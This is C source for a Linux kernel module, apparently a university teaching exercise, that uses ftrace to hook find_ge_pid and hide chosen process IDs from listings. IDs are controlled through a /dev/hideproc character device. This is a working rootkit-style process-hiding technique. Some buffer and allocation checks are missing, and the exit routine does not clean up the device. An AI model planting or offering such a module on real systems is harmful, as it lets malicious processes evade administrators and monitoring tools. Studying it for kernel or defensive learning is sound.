#include <linux/cdev.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/rbtree.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("National Cheng Kung University, Taiwan");

enum RETURN_CODE { SUCCESS };

struct ftrace_hook {
    const char *name;
    void *func, *orig;
    unsigned long address;
    struct ftrace_ops ops;
};

static int hook_resolve_addr(struct ftrace_hook *hook)
{
    hook->address = kallsyms_lookup_name(hook->name);
    if (!hook->address) {
        printk("unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }
    *((unsigned long *) hook->orig) = hook->address;
    return 0;
}

static void notrace hook_ftrace_thunk(unsigned long ip,
                                      unsigned long parent_ip,
                                      struct ftrace_ops *ops,
                                      struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->func;
}

static int hook_install(struct ftrace_hook *hook)
{
    int err = hook_resolve_addr(hook);
    if (err)
        return err;

    hook->ops.func = hook_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE |
                      FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        printk("ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk("register_ftrace_function() failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }
    return 0;
}

void hook_remove(struct ftrace_hook *hook)
{
    int err = unregister_ftrace_function(&hook->ops);
    if (err)
        printk("unregister_ftrace_function() failed: %d\n", err);
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
        printk("ftrace_set_filter_ip() failed: %d\n", err);
}

typedef struct {
    pid_t id;
    struct rb_node node;
} pid_node_t;

struct rb_root hidden_proc = RB_ROOT;
struct rb_root *p2hidden_proc;

typedef struct pid *(*find_ge_pid_func)(int nr, struct pid_namespace *ns);
static find_ge_pid_func real_find_ge_pid;

static struct ftrace_hook hook;

static pid_node_t *get_hidden_proc(pid_t pid)
{
    struct rb_node **now_node = &(p2hidden_proc->rb_node);
    struct rb_node *parent = NULL;

    while(*now_node) {
        pid_node_t *this = container_of(*now_node, pid_node_t, node);   
        if(pid < this->id) {
            now_node = &((*now_node)->rb_left);
	} else if(pid > this->id) {
            now_node = &((*now_node)->rb_right);
        } else {
            return this; 
        }
    }
    return NULL;
}

static bool is_hidden_proc(pid_t pid)
{
    pid_node_t *result = get_hidden_proc(pid);
    return result == NULL ? false : true;
}

static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns)
{
    struct pid *pid = real_find_ge_pid(nr, ns);
    while (pid && is_hidden_proc(pid->numbers->nr))
        pid = real_find_ge_pid(pid->numbers->nr + 1, ns);
    return pid;
}

static void init_hook(void)
{
    real_find_ge_pid = (find_ge_pid_func) kallsyms_lookup_name("find_ge_pid");
    hook.name = "find_ge_pid";
    hook.func = hook_find_ge_pid;
    hook.orig = &real_find_ge_pid;
    hook_install(&hook);
}

static int hide_process(pid_t pid)
{
    struct rb_node **now_node = &(p2hidden_proc->rb_node);
    struct rb_node *parent = NULL;

    while(*now_node) {
        pid_node_t *this = container_of(*now_node, pid_node_t, node);   
        parent = *now_node;
        if(pid < this->id) {
            now_node = &((*now_node)->rb_left);
	} else if(pid > this->id) {
            now_node = &((*now_node)->rb_right);
        } else {
            return SUCCESS;
        }
    }

    pid_node_t *proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
    proc->id = pid;  

    rb_link_node(&proc->node, parent, now_node);
    rb_insert_color(&proc->node, p2hidden_proc);

    return SUCCESS;
}

static int unhide_process(pid_t pid)
{
    pid_node_t *result = get_hidden_proc(pid);
    if(result) {
        rb_erase(&result->node, &hidden_proc);
	kfree(result);
    }
    return SUCCESS;
}

#define OUTPUT_BUFFER_FORMAT "pid: %d\n"
#define MAX_MESSAGE_SIZE (sizeof(OUTPUT_BUFFER_FORMAT) + 4)

static int device_open(struct inode *inode, struct file *file)
{
    return SUCCESS;
}

static int device_close(struct inode *inode, struct file *file)
{
    return SUCCESS;
}

static ssize_t device_read(struct file *filep,
                           char *buffer,
                           size_t len,
                           loff_t *offset)
{
    pid_node_t *proc, *tmp_proc;
    char message[MAX_MESSAGE_SIZE];
    if (*offset)
        return 0;

    rbtree_postorder_for_each_entry_safe(proc, tmp_proc, &hidden_proc, node) {
        memset(message, 0, MAX_MESSAGE_SIZE);
        sprintf(message, OUTPUT_BUFFER_FORMAT, proc->id);
        copy_to_user(buffer + *offset, message, strlen(message));
        *offset += strlen(message);
    }
    return *offset;
}

static ssize_t device_write(struct file *filep,
                            const char *buffer,
                            size_t len,
                            loff_t *offset)
{
    long pid;
    char *message;

    char add_message[] = "add", del_message[] = "del";
    if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
        return -EAGAIN;

    message = kmalloc(len + 1, GFP_KERNEL);
    memset(message, 0, len + 1);
    copy_from_user(message, buffer, len);

    if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
        kstrtol(message + sizeof(add_message), 10, &pid);
        hide_process(pid);
    } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
        kstrtol(message + sizeof(del_message), 10, &pid);
        unhide_process(pid);
    } else {
        kfree(message);
        return -EAGAIN;
    }

    *offset = len;
    kfree(message);
    return len;
}

static struct cdev cdev;
static struct class *hideproc_class = NULL;

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = device_open,
    .release = device_close,
    .read = device_read,
    .write = device_write,
};

#define MINOR_VERSION 1
#define DEVICE_NAME "hideproc"

static int _hideproc_init(void)
{
    int err, dev_major;
    dev_t dev;
    printk(KERN_INFO "@ %s\n", __func__);

    p2hidden_proc = &hidden_proc;

    // MAJOR number 是動態給定的
    err = alloc_chrdev_region(&dev, 0, MINOR_VERSION, DEVICE_NAME);
    dev_major = MAJOR(dev);


    // THIS_MODULE 是 linux 本身的巨集
    // 先取得 class，稍後才能使用這個 class 來創建節點
    hideproc_class = class_create(THIS_MODULE, DEVICE_NAME);

    // cdev --> 字元裝置 ( character device )
    // cdev_init --> 初始化一些 function
    // 這時候 character device 還不會家道系統內
    cdev_init(&cdev, &fops);

    // 將一個 character device 加到系統內
    cdev_add(&cdev, MKDEV(dev_major, MINOR_VERSION), 1);

    // 使用剛剛取得的 class，在 /dev 創建節點
    // MKDEV(major number, minor number) --> 使用 major number & minor number 來取得 dev_t
    device_create(hideproc_class, NULL, MKDEV(dev_major, MINOR_VERSION), NULL,
                  DEVICE_NAME);

    init_hook();

    return 0;
}

static void _hideproc_exit(void)
{
    printk(KERN_INFO "@ %s\n", __func__);
    hook_remove(&hook);
}

module_init(_hideproc_init);
module_exit(_hideproc_exit);